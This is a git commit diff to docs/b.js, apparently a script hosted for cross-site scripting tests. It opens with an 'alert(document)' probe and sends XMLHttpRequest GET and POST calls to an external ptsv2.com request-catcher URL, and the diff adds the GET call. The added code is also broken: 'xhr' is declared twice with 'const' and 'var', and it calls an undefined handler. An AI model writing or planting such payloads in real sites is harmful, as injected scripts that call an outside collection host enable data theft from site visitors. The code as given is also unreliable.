8c4e1a2b4e546ff3ca94fce36cbfaa9da1ed6e28
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 17:57:43 +0100

    Update and rename a.js to b.js

--- docs/b.js
+++ docs/b.js
@@ -1,5 +1,12 @@
 
 alert(document);
+const xhr = new XMLHttpRequest();
+const url = 'https://ptsv2.com/t/fyrw2-1641653611/post';
+
+xhr.open('GET', url);
+xhr.onreadystatechange = someHandler;
+xhr.send();
+
 var xhr = new XMLHttpRequest();
 xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
 xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://ptsv2.com');
